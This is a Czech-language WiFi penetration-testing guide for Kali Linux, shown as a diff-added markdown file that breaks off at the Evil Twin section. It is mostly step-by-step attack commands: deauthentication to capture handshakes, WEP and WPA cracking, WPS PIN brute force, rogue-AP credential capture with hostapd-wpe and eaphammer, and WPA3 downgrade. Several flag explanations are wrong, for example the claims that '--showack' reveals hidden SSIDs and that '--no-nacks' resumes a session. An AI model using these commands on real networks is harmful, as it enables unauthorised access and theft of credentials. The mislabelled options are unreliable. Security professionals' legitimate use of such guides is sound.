@@ -1,0 +1,1992 @@
+---
+---
+# 📡 WiFi Penetrační testování s Kali Linux — Kompletní průvodce
+
+> **⚠️ PRÁVNÍ UPOZORNĚNÍ:** Veškeré techniky popsané v tomto dokumentu jsou určeny **výhradně pro legální penetrační testování** na sítích, ke kterým máte **písemné povolení vlastníka**. Neoprávněný přístup k bezdrátovým sítím je trestný čin dle § 230 Trestního zákoníku ČR. Tento dokument slouží pouze pro vzdělávací účely a certifikované bezpečnostní profesionály.
+
+---
+
+## Obsah
+
+1. [Základy WiFi bezpečnosti](#1-z%C3%A1klady-wifi-bezpe%C4%8Dnosti)
+2. [Hardware a příprava prostředí](#2-hardware-a-p%C5%99%C3%ADprava-prost%C5%99ed%C3%AD)
+3. [Monitor mód a packet injection](#3-monitor-m%C3%B3d-a-packet-injection)
+4. [Průzkum a mapování WiFi sítí](#4-pr%C5%AFzkum-a-mapov%C3%A1n%C3%AD-wifi-s%C3%ADt%C3%AD)
+5. [Útok na WEP](#5-%C3%BAtok-na-wep)
+6. [Útok na WPA/WPA2 Personal](#6-%C3%BAtok-na-wpawpa2-personal)
+7. [Útok na WPS](#7-%C3%BAtok-na-wps)
+8. [Útok na WPA2 Enterprise (802.1X)](#8-%C3%BAtok-na-wpa2-enterprise-8021x)
+9. [Útok na WPA3](#9-%C3%BAtok-na-wpa3)
+10. [Evil Twin & Rogue AP útoky](#10-evil-twin--rogue-ap-%C3%BAtoky)
+11. [PMKID útok](#11-pmkid-%C3%BAtok)
+12. [Deautentizační útoky & DoS](#12-deautentiza%C4%8Dn%C3%AD-%C3%BAtoky--dos)
+13. [Sniffing a analýza provozu](#13-sniffing-a-anal%C3%BDza-provozu)
+14. [Cracking hesel — pokročilé techniky](#14-cracking-hesel--pokro%C4%8Dil%C3%A9-techniky)
+15. [Automatizované nástroje](#15-automatizovan%C3%A9-n%C3%A1stroje)
+16. [Post-exploitation po WiFi přístupu](#16-post-exploitation-po-wifi-p%C5%99%C3%ADstupu)
+17. [Obrana a hardening](#17-obrana-a-hardening)
+18. [Reporting WiFi auditu](#18-reporting-wifi-auditu)
+
+---
+
+## 1. Základy WiFi bezpečnosti
+
+### 1.1 Přehled WiFi standardů
+
+|Standard|Frekv. pásmo|Max rychlost|Bezpečnost|
+|---|---|---|---|
+|802.11b|2.4 GHz|11 Mbps|WEP (slabá)|
+|802.11g|2.4 GHz|54 Mbps|WEP/WPA|
+|802.11n|2.4/5 GHz|600 Mbps|WPA/WPA2|
+|802.11ac (WiFi 5)|5 GHz|3.5 Gbps|WPA2/WPA3|
+|802.11ax (WiFi 6/6E)|2.4/5/6 GHz|9.6 Gbps|WPA3|
+
+### 1.2 Bezpečnostní protokoly
+
+#### WEP (Wired Equivalent Privacy) — ZASTARALÝ, ÚPLNĚ PROLOMENÝ
+
+- RC4 proudová šifra se statickými klíči
+- Slabé IV (Initialization Vector) — pouze 24 bitů
+- Prolomitelný za minuty při dostatku provozu
+- **Status: Nepoužívat nikdy**
+
+#### WPA (WiFi Protected Access)
+
+- TKIP (Temporal Key Integrity Protocol) šifrování
+- MIC (Message Integrity Check) místo CRC
+- Prolomitelný slovníkovým útokem na handshake
+- **Status: Zastaralý, nepoužívat**
+
+#### WPA2
+
+- AES-CCMP šifrování (128-bit)
+- Dvě verze: Personal (PSK) a Enterprise (802.1X)
+- Prolomitelný offline slovníkovým útokem na 4-way handshake nebo PMKID
+- **Status: Stále nejrozšířenější, akceptovatelný se silným heslem**
+
+#### WPA3
+
+- SAE (Simultaneous Authentication of Equals) — nahrazuje PSK
+- Forward secrecy — každá session má unikátní klíče
+- Odolný proti offline dictionary útokům
+- **Status: Doporučený, ale stále s některými zranitelnostmi (Dragonblood)**
+
+### 1.3 Klíčové pojmy
+
+```
+SSID     → Název WiFi sítě (může být skrytý)
+BSSID    → MAC adresa přístupového bodu (AP)
+ESSID    → Rozšířený SSID (u mesh/roaming sítí)
+Kanál    → Frekvenční kanál (1-13 pro 2.4GHz, 36-165 pro 5GHz)
+PMK      → Pairwise Master Key (odvozený z hesla)
+PTK      → Pairwise Transient Key (session klíč)
+GTK      → Group Temporal Key (broadcast šifrování)
+MIC      → Message Integrity Code
+4-Way Handshake → Proces autentizace WPA/WPA2
+PMKID    → Identifikátor PMK (zranitelný v WPA2)
+Beacon   → Pravidelné broadcastové zprávy AP
+Probe    → Klient hledá sítě v dosahu
+```
+
+### 1.4 4-Way Handshake — jak funguje
+
+```
+  KLIENT                              AP (Access Point)
+    │                                      │
+    │ ←──── 1. ANonce (náhodné číslo) ─────│
+    │                                      │
+    │ ──── 2. SNonce + MIC ───────────────→│
+    │       (klient odvodí PTK)            │ (AP odvodí PTK)
+    │                                      │
+    │ ←──── 3. GTK + MIC ─────────────────│
+    │                                      │
+    │ ──── 4. ACK ────────────────────────→│
+    │                                      │
+    │          [Šifrovaná komunikace]       │
+
+PMK = PBKDF2(HMAC-SHA1, heslo, SSID, 4096, 256)
+PTK = PRF(PMK + ANonce + SNonce + MAC_AP + MAC_klient)
+```
+
+---
+
+## 2. Hardware a příprava prostředí
+
+### 2.1 Doporučené WiFi adaptéry pro pentesting
+
+Aby bylo možné provádět WiFi penetrační testování, potřebujete adaptér podporující:
+
+- **Monitor mód** — pasivní zachytávání všech paketů
+- **Packet injection** — aktivní vysílání libovolných paketů
+
+|Adaptér|Čipset|Frek. pásma|Inject|Doporučení|
+|---|---|---|---|---|
+|Alfa AWUS036ACH|RTL8812AU|2.4/5 GHz|✅|⭐⭐⭐⭐⭐ Nejlepší volba|
+|Alfa AWUS036NHA|AR9271|2.4 GHz|✅|⭐⭐⭐⭐ Spolehlivý|
+|Alfa AWUS1900|RTL8814AU|2.4/5 GHz|✅|⭐⭐⭐⭐⭐ Dual-band|
+|Panda PAU09|RT5572|2.4/5 GHz|✅|⭐⭐⭐⭐|
+|TP-Link TL-WN722N v1|AR9271|2.4 GHz|✅|⭐⭐⭐⭐ (pouze v1!)|
+
+> ⚠️ **POZOR:** TP-Link TL-WN722N verze 2 a 3 používají jiný čipset (RTL8188EUS) a **nepodporují** packet injection bez speciálních driverů!
+
+### 2.2 Instalace driverů
+
+```bash
+# ═══════════════════════════════════════
+# RTLWIFI (RTL8812AU — Alfa AWUS036ACH)
+# ═══════════════════════════════════════
+sudo apt update
+sudo apt install -y dkms git
+git clone https://github.com/aircrack-ng/rtl8812au.git
+cd rtl8812au
+sudo make dkms_install
+
+# Nebo přes apt:
+sudo apt install -y realtek-rtl88xxau-dkms
+
+# ═══════════════════════════════════════
+# AR9271 (Alfa AWUS036NHA)
+# ═══════════════════════════════════════
+sudo apt install -y firmware-atheros
+
+# ═══════════════════════════════════════
+# Ověření instalace
+# ═══════════════════════════════════════
+lsusb                          # zobrazení USB adaptérů
+iw dev                         # výpis bezdrátových rozhraní
+iwconfig                       # konfigurace bezdrátových rozhraní
+```
+
+### 2.3 Kali Linux v VM — nastavení WiFi adaptéru
+
+```bash
+# Ve VirtualBoxu:
+# Devices → USB → [Váš WiFi adaptér]
+# Settings → USB → Add USB Device
+
+# Ve VMware:
+# VM → Removable Devices → [Váš WiFi adaptér] → Connect
+
+# Ověření v Kali:
+lsusb
+dmesg | grep -i usb
+```
+
+### 2.4 Instalace potřebných nástrojů
+
+```bash
+# Aktualizace systému
+sudo apt update && sudo apt upgrade -y
+
+# Základní wireless toolset
+sudo apt install -y aircrack-ng reaver bully wifite2 \
+  hcxtools hcxdumptool hashcat john hostapd dnsmasq \
+  mdk4 mdk3 kismet wireshark tshark bettercap \
+  cowpatty coWPAtty pyrit
+
+# Python knihovny
+pip3 install scapy
+
+# Wordlisty
+sudo apt install -y wordlists seclists
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+---
+
+## 3. Monitor mód a packet injection
+
+### 3.1 Nastavení monitor módu
+
+Monitor mód (aka promiscuous mód pro WiFi) umožňuje zachytávat veškerý bezdrátový provoz v dosahu, bez nutnosti být asociovaný k AP.
+
+```bash
+# ═══════════════════════════════════════
+# METODA 1: airmon-ng (doporučeno pro pentest)
+# ═══════════════════════════════════════
+
+# Zjistit název rozhraní
+iwconfig
+
+# Zabití procesů, které by mohly rušit
+sudo airmon-ng check kill
+
+# Spustit monitor mód
+sudo airmon-ng start wlan0
+
+# Rozhraní se přejmenuje na wlan0mon
+iwconfig wlan0mon
+
+# Zastavení monitor módu
+sudo airmon-ng stop wlan0mon
+
+# ═══════════════════════════════════════
+# METODA 2: ip / iw příkazy (manuálně)
+# ═══════════════════════════════════════
+
+# Vypnutí rozhraní
+sudo ip link set wlan0 down
+
+# Nastavení monitor módu
+sudo iw wlan0 set monitor control
+
+# Zapnutí rozhraní
+sudo ip link set wlan0 up
+
+# Ověření
+iwconfig wlan0 | grep Mode
+
+# ═══════════════════════════════════════
+# METODA 3: iwconfig (starší způsob)
+# ═══════════════════════════════════════
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+
+# ═══════════════════════════════════════
+# ZAMKNUTÍ NA KONKRÉTNÍ KANÁL
+# ═══════════════════════════════════════
+# Po spuštění monitor módu lze zamknout kanál
+sudo iwconfig wlan0mon channel 6
+sudo iw dev wlan0mon set channel 11
+```
+
+### 3.2 Test packet injection
+
+```bash
+# Test injekce paketů (základní)
+sudo aireplay-ng --test wlan0mon
+
+# Test injekce na konkrétní AP
+sudo aireplay-ng --test -e "SSID_Name" wlan0mon
+
+# Výstup úspěšného testu:
+# 15:23:01  Trying broadcast probe requests...
+# 15:23:01  Injection is working!
+# 15:23:03  Found 1 AP
+
+# Test síly signálu
+sudo airodump-ng wlan0mon --band abg
+```
+
+### 3.3 Správa kanálů a frekvenčních pásem
+
+```bash
+# Zobrazení podporovaných kanálů adaptérem
+iw list | grep -A 50 "Frequencies:"
+
+# Skenování jen na 2.4GHz (kanály 1-13)
+sudo airodump-ng wlan0mon --band bg
+
+# Skenování jen na 5GHz
+sudo airodump-ng wlan0mon --band a
+
+# Skenování obou pásem
+sudo airodump-ng wlan0mon --band abg
+
+# Nastavení konkrétní frekvence
+sudo iwconfig wlan0mon freq 2.437G  # kanál 6
+```
+
+---
+
+## 4. Průzkum a mapování WiFi sítí
+
+### 4.1 `airodump-ng` — základní průzkum
+
+**Co je:** Primární nástroj pro pasivní zachytávání 802.11 rámců a průzkum WiFi prostředí.  
+**Jak funguje:** V monitor módu zachytává všechny beacon frames, probe requesty/response a datové rámce. Zobrazuje BSSID, SSID, kanál, šifrování, sílu signálu a připojené klienty.
+
+```bash
+# ═══════════════════════════════════════
+# ZÁKLADNÍ SKENOVÁNÍ
+# ═══════════════════════════════════════
+
+# Skenování všech sítí v okolí
+sudo airodump-ng wlan0mon
+
+# Výstup airodump-ng — vysvětlení sloupců:
+# BSSID    → MAC adresa AP
+# PWR      → Síla signálu v dBm (čím blíže k 0, tím silnější)
+# Beacons  → Počet zachycených beacon frames
+# #Data    → Počet zachycených datových rámců
+# #/s      → Datové pakety za sekundu
+# CH       → Kanál
+# MB       → Maximální rychlost (MB/s)
+# ENC      → Typ šifrování (OPN/WEP/WPA/WPA2/WPA3)
+# CIPHER   → Šifrovací algoritmus (TKIP/CCMP/WRAP)
+# AUTH     → Autentizace (PSK/MGT/OPN)
+# ESSID    → Název sítě (SSID)
+
+# Skenování konkrétního kanálu
+sudo airodump-ng --channel 6 wlan0mon
+
+# Skenování konkrétní sítě (zamknout na BSSID a kanál)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
+
+# ═══════════════════════════════════════
+# UKLÁDÁNÍ ZACHYCENÝCH DAT
+# ═══════════════════════════════════════
+
+# Uložení do souborů (vytvoří .cap, .csv, .kismet.csv, .kismet.netxml)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+  -w /tmp/capture wlan0mon
+
+# Výsledné soubory:
+# capture-01.cap        → Zachycené pakety (pro aircrack-ng)
+# capture-01.csv        → Text/CSV výstup
+# capture-01.kismet.csv → Kismet formát
+
+# ═══════════════════════════════════════
+# POKROČILÉ MOŽNOSTI
+# ═══════════════════════════════════════
+
+# Zobrazit skryté SSID (sledovat probe requesty)
+sudo airodump-ng wlan0mon --showack
+
+# Filtrovat jen WPA sítě
+sudo airodump-ng wlan0mon --encrypt wpa
+
+# Filtrovat jen otevřené sítě
+sudo airodump-ng wlan0mon --encrypt OPN
+
+# Uložení ve specifickém formátu
+sudo airodump-ng wlan0mon -w scan --output-format pcap,csv,netxml
+
+# Ignorovat konkrétní BSSID (whitelist)
+sudo airodump-ng wlan0mon --ignore-negative-one
+```
+
+### 4.2 `kismet` — pokročilý wireless IDS/scanner
+
+**Co je:** Pokročilý bezdrátový detektor sítí, sniffer a IDS (Intrusion Detection System).  
+**Jak funguje:** Pasivně zachytává bezdrátový provoz a buduje detailní databázi všech detekovaných zařízení, sítí a jejich komunikace. Umí detekovat hidden SSID, rogue AP a různé útoky.
+
+```bash
+# Spuštění Kismet (webové rozhraní)
+sudo kismet
+
+# Přístup na: http://localhost:2501
+# Výchozí uživatel: kismet / kismet
+
+# Kismet z příkazové řádky
+sudo kismet -c wlan0mon
+
+# S logováním
+sudo kismet -c wlan0mon --log-prefix /tmp/kismet_logs
+
+# Kismet headless (bez GUI)
+sudo kismet --no-ncurses -c wlan0mon
+
+# Čtení uloženého kismet logu
+sudo kismet -r kismet_log.kismet
+
+# Exportovat data z databáze
+sqlite3 /tmp/kismet_logs/*.kismet \
+  "SELECT ssid, bssid, signal FROM devices" > networks.txt
+```
+
+### 4.3 `wash` — skenování WPS sítí
+
+**Co je:** Nástroj pro detekci AP s povoleným WPS protokolem.  
+**Jak funguje:** Zachytává beacon frames a hledá WPS informační elementy indikující přítomnost a stav WPS.
+
+```bash
+# Základní skenování WPS sítí
+sudo wash -i wlan0mon
+
+# Výstup wash — vysvětlení sloupců:
+# BSSID    → MAC adresa AP
+# Ch       → Kanál
+# dBm      → Síla signálu
+# WPS      → Verze WPS
+# Lck      → Zda je WPS uzamčen (Yes = AP zablokoval pokusy)
+# Vendor   → Výrobce AP
+# ESSID    → Název sítě
+
+# Skenovat konkrétní kanál
+sudo wash -i wlan0mon -c 6
+
+# Ignorovat uzamčené AP
+sudo wash -i wlan0mon --ignore-fcs
+```
+
+### 4.4 `netdiscover` — ARP průzkum
+
+```bash
+# Pasivní ARP skenování
+sudo netdiscover -p -i wlan0mon
+
+# Aktivní skenování sítě po připojení
+sudo netdiscover -i wlan0 -r 192.168.1.0/24
+```
+
+---
+
+## 5. Útok na WEP
+
+WEP je dnes prakticky zastaralý, ale stále se lze setkat s jeho použitím na starých zařízeních. Prolomení WEP je triviální a trvá minuty.
+
+### 5.1 Jak WEP funguje (a proč je slabý)
+
+```
+WEP šifrování:
+  Klíč (40 nebo 104 bitů) + IV (24 bitů) → RC4 keystream
+  Plaintext XOR RC4 keystream = Ciphertext
+
+Slabina:
+  - IV je pouze 24 bitů → opakuje se po ~16 mil. paketech
+  - Při dostatku provozu lze statisticky odvodit klíč
+  - FMS útok, KoreK útoky, PTW útok (nejúčinnější)
+```
+
+### 5.2 WEP cracking — kompletní workflow
+
+```bash
+# ═══════════════════════════════════════
+# KROK 1: Zjistit cíl
+# ═══════════════════════════════════════
+sudo airodump-ng wlan0mon
+# Najdeme WEP síť → zapsat BSSID, kanál, počet klientů
+
+# ═══════════════════════════════════════
+# KROK 2: Zachytit provoz na cílové síti
+# ═══════════════════════════════════════
+sudo airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF \
+  -w wep_capture wlan0mon
+
+# ═══════════════════════════════════════
+# KROK 3: Falešná autentizace (pokud nejsme v síti)
+# ═══════════════════════════════════════
+# Potřebujeme být "asociováni" s AP pro injection
+sudo aireplay-ng -1 0 -e "WEP_Network" \
+  -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Opakovaná falešná autentizace každých 30s
+sudo aireplay-ng -1 30 -o 1 -q 10 \
+  -e "WEP_Network" -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# ═══════════════════════════════════════
+# KROK 4: ARP Replay útok (generování IV)
+# ═══════════════════════════════════════
+# Toto je nejrychlejší metoda — replay ARP paketů
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF \
+  -h OO:UR:MA:CA:DD:RE wlan0mon
+
+# ═══════════════════════════════════════
+# KROK 5: Chopchop útok (alternativa)
+# ═══════════════════════════════════════
+# Dekryptuje WEP paket bez znalosti klíče
+sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF \
+  -h OO:UR:MA:CA:DD:RE wlan0mon
+
+# ═══════════════════════════════════════
+# KROK 6: Fragmentation útok (alternativa)
+# ═══════════════════════════════════════
+sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF \
+  -h OO:UR:MA:CA:DD:RE wlan0mon
+
+# ═══════════════════════════════════════
+# KROK 7: Crack WEP klíče
+# ═══════════════════════════════════════
+# Průběžný cracking (lze spustit během zachytávání)
+# Potřebujeme ~5000-10000 IV pro 64-bit klíč
+# Potřebujeme ~40000+ IV pro 128-bit klíč
+
+aircrack-ng wep_capture-01.cap
+
+# Agresivnější útok (více statistických metod)
+aircrack-ng -n 64 -x wep_capture-01.cap   # 64-bit WEP
+
+# Výsledek:
+# KEY FOUND! [ XX:XX:XX:XX:XX ] (ASCII: password)
+```
+
+---
+
+## 6. Útok na WPA/WPA2 Personal
+
+### 6.1 Zachycení 4-Way Handshake
+
+Handshake je zachycen ve chvíli, kdy se klient autentizuje k AP. Obsahuje dostatek informací pro offline slovníkový útok.
+
+```bash
+# ═══════════════════════════════════════
+# KROK 1: Skenování a identifikace cíle
+# ═══════════════════════════════════════
+sudo airodump-ng wlan0mon
+
+# Zapsat:
+# - BSSID: AA:BB:CC:DD:EE:FF
+# - Kanál: 6
+# - SSID: "TargetNetwork"
+# - Přítomní klienti: 11:22:33:44:55:66
+
+# ═══════════════════════════════════════
+# KROK 2: Zachytávat provoz na cíli
+# ═══════════════════════════════════════
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+  -w /tmp/wpa_capture wlan0mon
+
+# V pravém horním rohu čekat na:
+# WPA handshake: AA:BB:CC:DD:EE:FF
+
+# ═══════════════════════════════════════
+# KROK 3: Deautentizační útok (v druhém terminálu)
+# ═══════════════════════════════════════
+# Vynutit odpojení klienta → při reconnect zachytíme handshake
+
+# Deauth konkrétní klient (doporučeno — méně nápadné)
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF \
+  -c 11:22:33:44:55:66 wlan0mon
+
+# Broadcast deauth (všichni klienti)
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Parametry -0:
+# -0 5 → 5 deauth paketů (0 = nepřetržitě)
+# -a   → BSSID cílového AP
+# -c   → MAC adresa cílového klienta (volitelné)
+
+# ═══════════════════════════════════════
+# KROK 4: Ověření handshake
+# ═══════════════════════════════════════
+# Rychlá kontrola zachyceného souboru
+aircrack-ng /tmp/wpa_capture-01.cap
+
+# Detailní ověření pomocí pyrit
+pyrit -r /tmp/wpa_capture-01.cap analyze
+
+# Pomocí cowpatty
+cowpatty -r /tmp/wpa_capture-01.cap -s "TargetNetwork" -f -
+
+# Pomocí Wireshark:
+# Filtr: eapol
+# Hledáme pakety Message 1-4 (nebo alespoň M1+M2 nebo M2+M3)
+```
+
+### 6.2 Slovníkový útok pomocí aircrack-ng
+
+```bash
+# ═══════════════════════════════════════
+# ZÁKLADNÍ CRACKING
+# ═══════════════════════════════════════
+
+# Cracking s rockyou wordlistem
+aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  -b AA:BB:CC:DD:EE:FF /tmp/wpa_capture-01.cap
+
+# Cracking se zadaným SSID
+aircrack-ng -e "TargetNetwork" \
+  -w /usr/share/wordlists/rockyou.txt \
+  /tmp/wpa_capture-01.cap
+
+# Cracking s více wordlisty
+aircrack-ng -w wordlist1.txt,wordlist2.txt,wordlist3.txt \
+  /tmp/wpa_capture-01.cap
+
+# Cracking více .cap souborů najednou
+aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  /tmp/*.cap
+
+# Zobrazit progress
+aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  -b AA:BB:CC:DD:EE:FF /tmp/wpa_capture-01.cap \
+  | tee crack_output.txt
+```
+
+### 6.3 Konverze handshake do hashcat formátu
+
+```bash
+# ═══════════════════════════════════════
+# KONVERZE DO HASHCAT FORMÁTU
+# ═══════════════════════════════════════
+
+# Moderní způsob (hcxtools) — .hc22000 formát
+hcxpcapngtool -o hash.hc22000 /tmp/wpa_capture-01.cap
+
+# Starší způsob — .hccapx formát (hashcat mode 2500)
+cap2hccapx /tmp/wpa_capture-01.cap hash.hccapx
+
+# Ověření obsahu hc22000 souboru
+hcxhashtool -i hash.hc22000 --info=stdout
+
+# ═══════════════════════════════════════
+# HASHCAT CRACKING
+# ═══════════════════════════════════════
+
+# Slovníkový útok (WPA2 = mode 22000)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Slovník + pravidla (velmi efektivní)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# Kombinační útok (2 wordlisty)
+hashcat -m 22000 hash.hc22000 -a 1 words1.txt words2.txt
+
+# Brute-force s maskou (hesla délky 8 s číslicemi)
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+# Maska pro typická WiFi hesla (8 znaků lowercase + čísla)
+hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?d?d?d?d
+
+# Kombinace wordlistu a masky
+hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d
+
+# Zobrazení prolomených hesel
+hashcat -m 22000 hash.hc22000 --show
+
+# Pokračování přerušeného útoku
+hashcat -m 22000 hash.hc22000 wordlist.txt --restore
+```
+
+---
+
+## 7. Útok na WPS
+
+### 7.1 Jak WPS funguje (a proč je zranitelný)
+
+```
+WPS PIN autentizace:
+  PIN = 8 číslic, ale:
+  - 7. číslice je checksum → efektivně 7 číslic
+  - Ověřování probíhá ve 2 fázích (první 4, pak druhé 4)
+  
+Zranitelnost:
+  - Místo 10^7 = 10 000 000 kombinací
+  - Jsou to jen 10^4 + 10^3 = 11 000 kombinací!
+  - Pixie Dust: offline útok na slabé implementace RNG
+```
+
+### 7.2 `reaver` — WPS Brute-force
+
+**Co je:** Specializovaný nástroj pro brute-force útok na WPS PIN autentizaci.  
+**Jak funguje:** Iterativně zkouší PIN kombinace v optimálním pořadí a využívá zranitelnost v dělení PIN ověřování na dvě části.
+
+```bash
+# ═══════════════════════════════════════
+# ZÁKLADNÍ POUŽITÍ
+# ═══════════════════════════════════════
+
+# Nejdříve zkontrolovat WPS sítě
+sudo wash -i wlan0mon
+
+# Standardní brute-force útok
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
+
+# ═══════════════════════════════════════
+# PIXIE DUST ÚTOK (rychlejší)
+# ═══════════════════════════════════════
+# Funguje na AP s vadným generátorem náhodných čísel
+# Výrobci náchylní: Ralink, Realtek, Broadcom (některé verze)
+
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
+
+# ═══════════════════════════════════════
+# POKROČILÉ MOŽNOSTI
+# ═══════════════════════════════════════
+
+# Zpomalit útok (vyhnout se rate limiting)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -d 5 -r 3:15 -vvv
+# -d 5  → 5 sekund čekat mezi piny
+# -r 3:15 → po 3 pokusech čekat 15 sekund
+
+# Ignorovat WPS uzamčení (méně efektivní)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  --ignore-locks -vvv
+
+# Obnovení přerušeného útoku
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -vvv --no-nacks
+
+# Nastavení konkrétního kanálu
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -c 6 -vvv
+
+# Použití vlastního SSID
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -e "TargetNetwork" -vvv
+
+# Uložení progres (automaticky do ~/.reaver/)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -s /tmp/reaver_session.dat -vvv
+```
+
+### 7.3 `bully` — alternativní WPS tool
+
+**Co je:** Alternativa k reaver pro WPS útoky, napsaná v C.  
+**Jak funguje:** Podobný přístup jako reaver, ale s jiným způsobem zpracování chybových stavů a timeoutů.
+
+```bash
+# Základní útok
+sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -e "TargetNetwork" -c 6
+
+# Pixie Dust
+sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
+
+# S vlastním délkou čekání
+sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF \
+  -e "TargetNetwork" -c 6 -T 5 -d -v 3
+```
+
+---
+
+## 8. Útok na WPA2 Enterprise (802.1X)
+
+### 8.1 Jak WPA2 Enterprise funguje
+
+```
+WPA2 Enterprise architektura:
+  Klient → AP → RADIUS Server → Active Directory / LDAP
+
+Autentizační metody (EAP):
+  PEAP/MSCHAPv2 → Nejrozšířenější (Windows prostředí)
+  EAP-TLS       → Certifikátová autentizace (nejbezpečnější)
+  EAP-TTLS      → Tunelovaná TLS
+  EAP-FAST      → Cisco proprietární
+
+Útočná plocha:
+  1. Rogue AP → zachycení EAP výměny → crack MSCHAPv2
+  2. Evil Twin → man-in-the-middle → krádež credentials
+  3. Certificate validation bypass
+```
+
+### 8.2 `hostapd-wpe` — Rogue RADIUS server
+
+**Co je:** Modifikovaný hostapd s WPE (Wireless Pwnage Edition) patchem pro zachycení EAP autentizací.  
+**Jak funguje:** Vytvoří falešný AP se stejným SSID jako cíl. Klienti, kteří neověřují certifikát serveru, se připojí k falešnému AP a odešlou své přihlašovací údaje.
+
+```bash
+# Instalace
+sudo apt install -y hostapd-wpe
+
+# Konfigurace /etc/hostapd-wpe/hostapd-wpe.conf
+cat > /tmp/hostapd-wpe.conf << 'EOF'
+interface=wlan0mon
+ssid=TargetNetwork
+channel=6
+hw_mode=g
+ieee8021x=1
+eapol_version=2
+eap_server=1
+eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+wpe_logfile=/tmp/wpe.log
+EOF
+
+# Spuštění
+sudo hostapd-wpe /tmp/hostapd-wpe.conf
+
+# Zachycené credentials budou v /tmp/wpe.log
+# Formát: NETNTLM challenge/response pro crack
+cat /tmp/wpe.log
+```
+
+### 8.3 Cracking MSCHAPv2 (PEAP/MSCHAPv2)
+
+```bash
+# Po zachycení NETNTLM challenge/response z WPE logu:
+# username: john
+# challenge: 1234567890abcdef
+# response:  abcdef1234567890...
+
+# Cracking pomocí hashcat
+# Formát: username:::challenge:response:nt_response
+hashcat -m 5500 netntlm_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Nebo asleap (specializovaný nástroj)
+asleap -C aa:bb:cc:dd:ee:ff:00:11 -R aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11 -W /usr/share/wordlists/rockyou.txt
+
+# Online: https://crack.sh (velmi rychlý MSCHAPv2 crack)
+```
+
+### 8.4 `eaphammer` — pokročilý 802.1X útok
+
+**Co je:** Framework pro útoky na WPA2 Enterprise sítě.  
+**Jak funguje:** Kombinuje hostapd, RADIUS server a různé útočné techniky do jednoho nástroje.
+
+```bash
+# Instalace
+git clone https://github.com/s0lst1c3/eaphammer
+cd eaphammer
+sudo pip3 install -r pip.req
+sudo python3 eaphammer --cert-wizard
+
+# Generování certifikátů
+sudo python3 eaphammer --cert-wizard
+
+# Spuštění Rogue AP pro PEAP/MSCHAPv2 útok
+sudo python3 eaphammer -i wlan0 \
+  --channel 6 \
+  --auth wpa-eap \
+  --essid "TargetNetwork" \
+  --creds
+
+# GTC Downgrade útok (zachycení plaintext hesel)
+sudo python3 eaphammer -i wlan0 \
+  --channel 6 \
+  --auth wpa-eap \
+  --essid "TargetNetwork" \
+  --negotiate gtc-downgrade \
+  --creds
+```
+
+---
+
+## 9. Útok na WPA3
+
+### 9.1 Dragonblood zranitelnosti
+
+WPA3 používá SAE (Dragonfly) handshake, který byl v roce 2019 zranitelný vůči sérii útoků nazvaných Dragonblood.
+
+```
+Dragonblood zranitelnosti:
+  CVE-2019-9494 → Cache-based side-channel útok
+  CVE-2019-9496 → Denial of Service (SAE confirmation bypass)
+  CVE-2019-13377 → Timing-based side-channel (Brainpool curves)
+  CVE-2019-13456 → Side-channel útok přes IEEE 802.11r
+```
+
+### 9.2 `dragonslayer` — Dragonblood exploitation
+
+```bash
+# Instalace
+git clone https://github.com/vanhoefm/dragonslayer
+cd dragonslayer
+pip3 install -r requirements.txt
+
+# Downgrade útok (WPA3 → WPA2)
+# Funguje pokud AP podporuje WPA3/WPA2 Transition Mode
+sudo python3 dragonslayer.py \
+  --iface wlan0mon \
+  --target AA:BB:CC:DD:EE:FF \
+  --attack downgrade
+
+# Timing side-channel útok
+sudo python3 dragonslayer.py \
+  --iface wlan0mon \
+  --target AA:BB:CC:DD:EE:FF \
+  --attack timing
+```
+
+### 9.3 Obrana WPA3 Transition Mode bypass
+
+```bash
+# Útočník může vynutit připojení přes WPA2 u AP v Transition Mode
+# Použitím Evil Twin pouze s WPA2
+# Poté standardní WPA2 útok na handshake
+```
+
+---
+
+## 10. Evil Twin & Rogue AP útoky
+
+### 10.1 Jak Evil Twin funguje
+
+```
